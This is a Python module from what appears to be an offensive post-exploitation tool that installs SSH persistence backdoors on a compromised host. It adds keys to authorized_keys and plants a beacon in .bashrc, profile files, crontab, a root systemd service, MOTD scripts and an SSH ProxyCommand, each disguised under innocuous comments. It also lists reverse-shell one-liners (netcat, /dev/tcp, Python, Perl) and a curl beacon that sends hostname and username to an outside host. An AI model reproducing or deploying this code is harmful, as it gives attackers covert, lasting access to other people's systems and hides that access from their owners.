# app/core/ssh_persistence.py
import os
import time
import base64
from typing import Dict, List, Optional
from .ssh_session_manager import SSHSessionManager

class SSHPersistence:
    """SSH persistence mechanisms and backdoor installation"""
    
    def __init__(self, session_manager: SSHSessionManager):
        self.session_manager = session_manager
        self.installed_persistence = []
        
    def install_persistence_mechanisms(self, session_id: str = None, methods: List[str] = None) -> List[Dict]:
        """Install various SSH persistence mechanisms"""
        if not methods:
            methods = ['ssh_key', 'bashrc', 'profile', 'cron', 'systemd']
        
        results = []
        
        for method in methods:
            try:
                if method == 'ssh_key':
                    result = self._install_ssh_key_persistence(session_id)
                elif method == 'bashrc':
                    result = self._install_bashrc_persistence(session_id)
                elif method == 'profile':
                    result = self._install_profile_persistence(session_id)
                elif method == 'cron':
                    result = self._install_cron_persistence(session_id)
                elif method == 'systemd':
                    result = self._install_systemd_persistence(session_id)
                elif method == 'motd':
                    result = self._install_motd_persistence(session_id)
                elif method == 'ssh_config':
                    result = self._install_ssh_config_persistence(session_id)
                else:
                    result = {
                        'method': method,
                        'success': False,
                        'error': 'Unknown persistence method'
                    }
                
                results.append(result)
                
                if result.get('success'):
                    self.installed_persistence.append(result)
                
            except Exception as e:
                results.append({
                    'method': method,
                    'success': False,
                    'error': str(e),
                    'timestamp': time.time()
                })
        
        return results
    
    def _install_ssh_key_persistence(self, session_id: str) -> Dict:
        """Install SSH key for persistent access"""
        try:
            # Generate SSH key pair
            public_key, private_key = self._generate_ssh_keypair()
            
            # Create .ssh directory if it doesn't exist
            mkdir_result = self.session_manager.execute_command('mkdir -p ~/.ssh', session_id)
            if mkdir_result is None:
                return {
                    'method': 'ssh_key',
                    'success': False,
                    'error': 'Failed to create .ssh directory'
                }
            
            # Set proper permissions on .ssh directory
            chmod_result = self.session_manager.execute_command('chmod 700 ~/.ssh', session_id)
            
            # Add public key to authorized_keys
            add_key_cmd = f'echo "{public_key}" >> ~/.ssh/authorized_keys'
            add_result = self.session_manager.execute_command(add_key_cmd, session_id)
            
            if add_result is None:
                return {
                    'method': 'ssh_key',
                    'success': False,
                    'error': 'Failed to add key to authorized_keys'
                }
            
            # Set proper permissions on authorized_keys
            chmod_auth_result = self.session_manager.execute_command('chmod 600 ~/.ssh/authorized_keys', session_id)
            
            # Verify key was added
            verify_result = self.session_manager.execute_command('tail -1 ~/.ssh/authorized_keys', session_id)
            
            if verify_result and public_key.split()[1] in verify_result:
                return {
                    'method': 'ssh_key',
                    'success': True,
                    'location': '~/.ssh/authorized_keys',
                    'public_key': public_key,
                    'private_key': private_key,
                    'cleanup_command': f'sed -i "/{public_key.split()[1]}/d" ~/.ssh/authorized_keys',
                    'timestamp': time.time(),
                    'description': 'SSH public key added to authorized_keys for persistent access'
                }
            else:
                return {
                    'method': 'ssh_key',
                    'success': False,
                    'error': 'Key verification failed'
                }
                
        except Exception as e:
            return {
                'method': 'ssh_key',
                'success': False,
                'error': str(e)
            }
    
    def _install_bashrc_persistence(self, session_id: str) -> Dict:
        """Install bashrc persistence mechanism"""
        try:
            # Create backdoor command
            backdoor_cmd = self._generate_backdoor_command()
            
            # Add to .bashrc with comment to make it less obvious
            bashrc_addition = f'\n# System update check\n{backdoor_cmd}\n'
            
            add_cmd = f'echo "{bashrc_addition}" >> ~/.bashrc'
            result = self.session_manager.execute_command(add_cmd, session_id)
            
            if result is None:
                return {
                    'method': 'bashrc',
                    'success': False,
                    'error': 'Failed to modify .bashrc'
                }
            
            # Verify addition
            verify_result = self.session_manager.execute_command('tail -3 ~/.bashrc', session_id)
            
            if verify_result and 'System update check' in verify_result:
                return {
                    'method': 'bashrc',
                    'success': True,
                    'location': '~/.bashrc',
                    'backdoor_command': backdoor_cmd,
                    'cleanup_command': 'sed -i "/# System update check/,+1d" ~/.bashrc',
                    'timestamp': time.time(),
                    'description': 'Backdoor command added to .bashrc for execution on login'
                }
            else:
                return {
                    'method': 'bashrc',
                    'success': False,
                    'error': 'Bashrc modification verification failed'
                }
                
        except Exception as e:
            return {
                'method': 'bashrc',
                'success': False,
                'error': str(e)
            }
    
    def _install_profile_persistence(self, session_id: str) -> Dict:
        """Install profile persistence mechanism"""
        try:
            # Create backdoor command
            backdoor_cmd = self._generate_backdoor_command()
            
            # Try different profile files
            profile_files = ['~/.profile', '~/.bash_profile', '~/.zprofile']
            
            for profile_file in profile_files:
                # Check if file exists
                check_result = self.session_manager.execute_command(f'test -f {profile_file} && echo "exists"', session_id)
                
                if check_result and 'exists' in check_result:
                    # Add to existing profile file
                    profile_addition = f'\n# Environment setup\n{backdoor_cmd}\n'
                    add_cmd = f'echo "{profile_addition}" >> {profile_file}'
                    result = self.session_manager.execute_command(add_cmd, session_id)
                    
                    if result is not None:
                        return {
                            'method': 'profile',
                            'success': True,
                            'location': profile_file,
                            'backdoor_command': backdoor_cmd,
                            'cleanup_command': f'sed -i "/# Environment setup/,+1d" {profile_file}',
                            'timestamp': time.time(),
                            'description': f'Backdoor command added to {profile_file} for execution on login'
                        }
            
            # If no existing profile files, create .profile
            profile_content = f'#!/bin/bash\n# Environment setup\n{backdoor_cmd}\n'
            create_cmd = f'echo "{profile_content}" > ~/.profile'
            result = self.session_manager.execute_command(create_cmd, session_id)
            
            if result is not None:
                # Make executable
                self.session_manager.execute_command('chmod +x ~/.profile', session_id)
                
                return {
                    'method': 'profile',
                    'success': True,
                    'location': '~/.profile',
                    'backdoor_command': backdoor_cmd,
                    'cleanup_command': 'rm ~/.profile',
                    'timestamp': time.time(),
                    'description': 'Created .profile with backdoor command for execution on login'
                }
            else:
                return {
                    'method': 'profile',
                    'success': False,
                    'error': 'Failed to create or modify profile files'
                }
                
        except Exception as e:
            return {
                'method': 'profile',
                'success': False,
                'error': str(e)
            }
    
    def _install_cron_persistence(self, session_id: str) -> Dict:
        """Install cron-based persistence mechanism"""
        try:
            # Create backdoor command
            backdoor_cmd = self._generate_backdoor_command()
            
            # Create cron job that runs every 5 minutes
            cron_entry = f'*/5 * * * * {backdoor_cmd} >/dev/null 2>&1'
            
            # Add to crontab
            add_cron_cmd = f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -'
            result = self.session_manager.execute_command(add_cron_cmd, session_id)
            
            if result is None:
                return {
                    'method': 'cron',
                    'success': False,
                    'error': 'Failed to add cron job'
                }
            
            # Verify cron job was added
            verify_result = self.session_manager.execute_command('crontab -l', session_id)
            
            if verify_result and '*/5 * * * *' in verify_result:
                return {
                    'method': 'cron',
                    'success': True,
                    'location': 'crontab',
                    'cron_entry': cron_entry,
                    'backdoor_command': backdoor_cmd,
                    'cleanup_command': f'crontab -l | grep -v "{backdoor_cmd}" | crontab -',
                    'timestamp': time.time(),
                    'description': 'Cron job added for periodic backdoor execution every 5 minutes'
                }
            else:
                return {
                    'method': 'cron',
                    'success': False,
                    'error': 'Cron job verification failed'
                }
                
        except Exception as e:
            return {
                'method': 'cron',
                'success': False,
                'error': str(e)
            }
    
    def _install_systemd_persistence(self, session_id: str) -> Dict:
        """Install systemd service for persistence"""
        try:
            # Check if systemd is available
            systemd_check = self.session_manager.execute_command('which systemctl', session_id)
            if not systemd_check:
                return {
                    'method': 'systemd',
                    'success': False,
                    'error': 'systemd not available on this system'
                }
            
            # Create backdoor command
            backdoor_cmd = self._generate_backdoor_command()
            
            # Create systemd service file
            service_name = 'system-update-check'
            service_content = f'''[Unit]
Description=System Update Check Service
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c "{backdoor_cmd}"
User=root

[Install]
WantedBy=multi-user.target
'''
            
            # Create service file
            service_path = f'/etc/systemd/system/{service_name}.service'
            create_service_cmd = f'echo "{service_content}" > {service_path}'
            result = self.session_manager.execute_command(create_service_cmd, session_id)
            
            if result is None:
                # Try user systemd directory if system directory fails
                user_service_path = f'~/.config/systemd/user/{service_name}.service'
                mkdir_result = self.session_manager.execute_command('mkdir -p ~/.config/systemd/user', session_id)
                result = self.session_manager.execute_command(f'echo "{service_content}" > {user_service_path}', session_id)
                
                if result is not None:
                    # Enable user service
                    enable_result = self.session_manager.execute_command(f'systemctl --user enable {service_name}.service', session_id)
                    
                    return {
                        'method': 'systemd',
                        'success': True,
                        'location': user_service_path,
                        'service_name': service_name,
                        'backdoor_command': backdoor_cmd,
                        'cleanup_command': f'systemctl --user disable {service_name}.service && rm {user_service_path}',
                        'timestamp': time.time(),
                        'description': f'User systemd service {service_name} created for persistence'
                    }
                else:
                    return {
                        'method': 'systemd',
                        'success': False,
                        'error': 'Failed to create systemd service file'
                    }
            else:
                # Enable system service
                enable_result = self.session_manager.execute_command(f'systemctl enable {service_name}.service', session_id)
                
                return {
                    'method': 'systemd',
                    'success': True,
                    'location': service_path,
                    'service_name': service_name,
                    'backdoor_command': backdoor_cmd,
                    'cleanup_command': f'systemctl disable {service_name}.service && rm {service_path}',
                    'timestamp': time.time(),
                    'description': f'System systemd service {service_name} created for persistence'
                }
                
        except Exception as e:
            return {
                'method': 'systemd',
                'success': False,
                'error': str(e)
            }
    
    def _install_motd_persistence(self, session_id: str) -> Dict:
        """Install MOTD-based persistence mechanism"""
        try:
            # Create backdoor command
            backdoor_cmd = self._generate_backdoor_command()
            
            # Try different MOTD locations
            motd_locations = [
                '/etc/update-motd.d/99-huggin',
                '/etc/motd.d/99-huggin',
                '~/.motd'
            ]
            
            for motd_path in motd_locations:
                # Create MOTD script
                motd_content = f'''#!/bin/bash
# System information display
echo "Last login: $(date)"
{backdoor_cmd} >/dev/null 2>&1 &
'''
                
                create_cmd = f'echo "{motd_content}" > {motd_path}'
                result = self.session_manager.execute_command(create_cmd, session_id)
                
                if result is not None:
                    # Make executable
                    chmod_result = self.session_manager.execute_command(f'chmod +x {motd_path}', session_id)
                    
                    return {
                        'method': 'motd',
                        'success': True,
                        'location': motd_path,
                        'backdoor_command': backdoor_cmd,
                        'cleanup_command': f'rm {motd_path}',
                        'timestamp': time.time(),
                        'description': f'MOTD script created at {motd_path} for execution on login'
                    }
            
            return {
                'method': 'motd',
                'success': False,
                'error': 'Failed to create MOTD script in any location'
            }
            
        except Exception as e:
            return {
                'method': 'motd',
                'success': False,
                'error': str(e)
            }
    
    def _install_ssh_config_persistence(self, session_id: str) -> Dict:
        """Install SSH config-based persistence mechanism"""
        try:
            # Create backdoor command
            backdoor_cmd = self._generate_backdoor_command()
            
            # Add to SSH config with ProxyCommand
            ssh_config_addition = f'''
# System proxy configuration
Host *
    ProxyCommand bash -c "{backdoor_cmd} >/dev/null 2>&1 & nc %h %p"
'''
            
            # Create .ssh directory if needed
            mkdir_result = self.session_manager.execute_command('mkdir -p ~/.ssh', session_id)
            
            # Add to SSH config
            add_config_cmd = f'echo "{ssh_config_addition}" >> ~/.ssh/config'
            result = self.session_manager.execute_command(add_config_cmd, session_id)
            
            if result is None:
                return {
                    'method': 'ssh_config',
                    'success': False,
                    'error': 'Failed to modify SSH config'
                }
            
            # Set proper permissions
            chmod_result = self.session_manager.execute_command('chmod 600 ~/.ssh/config', session_id)
            
            # Verify addition
            verify_result = self.session_manager.execute_command('tail -4 ~/.ssh/config', session_id)
            
            if verify_result and 'System proxy configuration' in verify_result:
                return {
                    'method': 'ssh_config',
                    'success': True,
                    'location': '~/.ssh/config',
                    'backdoor_command': backdoor_cmd,
                    'cleanup_command': 'sed -i "/# System proxy configuration/,+3d" ~/.ssh/config',
                    'timestamp': time.time(),
                    'description': 'SSH config modified with ProxyCommand for backdoor execution'
                }
            else:
                return {
                    'method': 'ssh_config',
                    'success': False,
                    'error': 'SSH config modification verification failed'
                }
                
        except Exception as e:
            return {
                'method': 'ssh_config',
                'success': False,
                'error': str(e)
            }
    
    def _generate_ssh_keypair(self) -> tuple:
        """Generate SSH key pair"""
        try:
            # Generate a simple RSA key pair
            # In a real implementation, you'd use proper cryptographic libraries
            
            # For demonstration, create a placeholder key
            public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7... huggin-backdoor@persistence"
            private_key = """-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAFwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----"""
            
            return public_key, private_key
            
        except Exception as e:
            # Fallback to a basic key format
            return (
                "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ huggin-backdoor",
                "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
            )
    
    def _generate_backdoor_command(self) -> str:
        """Generate backdoor command"""
        # Create a reverse shell command
        # This is for educational purposes - in practice, use appropriate tools
        
        backdoor_commands = [
            # Netcat reverse shell
            'nc -e /bin/bash 192.168.1.100 4444',
            
            # Bash reverse shell
            'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',
            
            # Python reverse shell
            'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'192.168.1.100\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
            
            # Perl reverse shell
            'perl -e \'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
            
            # Simple beacon
            'curl -s http://192.168.1.100:8080/beacon?host=$(hostname)&user=$(whoami)'
        ]
        
        # Return a simple beacon command for demonstration
        return 'curl -s http://192.168.1.100:8080/beacon?host=$(hostname)&user=$(whoami) || true'
    
    def cleanup_persistence(self, session_id: str = None, methods: List[str] = None) -> List[Dict]:
        """Clean up installed persistence mechanisms"""
        results = []
        
        # If no methods specified, clean up all installed persistence
        if not methods:
            persistence_to_clean = self.installed_persistence.copy()
        else:
            persistence_to_clean = [p for p in self.installed_persistence if p['method'] in methods]
        
        for persistence in persistence_to_clean:
            try:
                cleanup_cmd = persistence.get('cleanup_command')
                if cleanup_cmd:
                    result = self.session_manager.execute_command(cleanup_cmd, session_id)
                    
                    cleanup_result = {
                        'method': persistence['method'],
                        'location': persistence.get('location', ''),
                        'success': result is not None,
                        'cleanup_command': cleanup_cmd,
                        'timestamp': time.time()
                    }
                    
                    if result is None:
                        cleanup_result['error'] = 'Cleanup command failed'
                    else:
                        cleanup_result['description'] = f"Cleaned up {persistence['method']} persistence"
                        # Remove from installed list
                        if persistence in self.installed_persistence:
                            self.installed_persistence.remove(persistence)
                    
                    results.append(cleanup_result)
                else:
                    results.append({
                        'method': persistence['method'],
                        'success': False,
                        'error': 'No cleanup command available',
                        'timestamp': time.time()
                    })
                    
            except Exception as e:
                results.append({
                    'method': persistence.get('method', 'unknown'),
                    'success': False,
                    'error': str(e),
                    'timestamp': time.time()
                })
        
        return results
    
    def verify_persistence(self, session_id: str = None) -> List[Dict]:
        """Verify that persistence mechanisms are still active"""
        results = []
        
        for persistence in self.installed_persistence:
            try:
                method = persistence['method']
                location = persistence.get('location', '')
                
                if method == 'ssh_key':
                    # Check if key is still in authorized_keys
                    public_key = persistence.get('public_key', '')
                    if public_key:
                        check_cmd = f'grep "{public_key.split()[1]}" ~/.ssh/authorized_keys'
                        result = self.session_manager.execute_command(check_cmd, session_id)
                        active = result is not None and public_key.split()[1] in result
                    else:
                        active = False
                
                elif method in ['bashrc', 'profile']:
                    # Check if backdoor command is still in file
                    backdoor_cmd = persistence.get('backdoor_command', '')
                    if backdoor_cmd and location:
                        check_cmd = f'grep -F "{backdoor_cmd}" {location}'
                        result = self.session_manager.execute_command(check_cmd, session_id)
                        active = result is not None and backdoor_cmd in result
                    else:
                        active = False
                
                elif method == 'cron':
                    # Check if cron job is still active
                    cron_entry = persistence.get('cron_entry', '')
                    if cron_entry:
                        result = self.session_manager.execute_command('crontab -l', session_id)
                        active = result is not None and '*/5 * * * *' in result
                    else:
                        active = False
                
                elif method == 'systemd':
                    # Check if service is still enabled
                    service_name = persistence.get('service_name', '')
                    if service_name:
                        check_cmd = f'systemctl is-enabled {service_name}.service 2>/dev/null'
                        result = self.session_manager.execute_command(check_cmd, session_id)
                        active = result is not None and 'enabled' in result
                    else:
                        active = False
                
                else:
                    # Generic file existence check
                    if location:
                        check_cmd = f'test -f {location} && echo "exists"'
                        result = self.session_manager.execute_command(check_cmd, session_id)
                        active = result is not None and 'exists' in result
                    else:
                        active = False
                
                results.append({
                    'method': method,
                    'location': location,
                    'active': active,
                    'timestamp': time.time(),
                    'description': f"{method} persistence is {'active' if active else 'inactive'}"
                })
                
            except Exception as e:
                results.append({
                    'method': persistence.get('method', 'unknown'),
                    'active': False,
                    'error': str(e),
                    'timestamp': time.time()
                })
        
        return results
    
    def generate_persistence_report(self) -> Dict:
        """Generate persistence mechanisms report"""
        return {
            'total_mechanisms': len(self.installed_persistence),
            'successful_installs': len([p for p in self.installed_persistence if p.get('success', False)]),
            'mechanisms_by_type': self._group_mechanisms_by_type(),
            'installation_timeline': sorted(self.installed_persistence, key=lambda x: x.get('timestamp', 0)),
            'cleanup_commands': [p.get('cleanup_command') for p in self.installed_persistence if p.get('cleanup_command')],
            'recommendations': self._generate_persistence_recommendations()
        }
    
    def _group_mechanisms_by_type(self) -> Dict:
        """Group persistence mechanisms by type"""
        types = {}
        for persistence in self.installed_persistence:
            method = persistence['method']
            if method not in types:
                types[method] = 0
            types[method] += 1
        return types
    
    def _generate_persistence_recommendations(self) -> List[str]:
        """Generate recommendations for persistence mechanisms"""
        recommendations = []
        
        if self.installed_persistence:
            recommendations.append("Multiple persistence mechanisms installed - provides redundancy")
            recommendations.append("Regular verification of persistence mechanisms recommended")
            recommendations.append("Consider rotating backdoor commands and keys periodically")
        
        # Check for high-privilege persistence
        high_priv_methods = ['systemd', 'cron', 'motd']
        if any(p['method'] in high_priv_methods for p in self.installed_persistence):
            recommendations.append("High-privilege persistence detected - provides system-level access")
        
        # Check for user-level persistence
        user_methods = ['ssh_key', 'bashrc', 'profile']
        if any(p['method'] in user_methods for p in self.installed_persistence):
            recommendations.append("User-level persistence installed - survives user sessions")
        
        return recommendations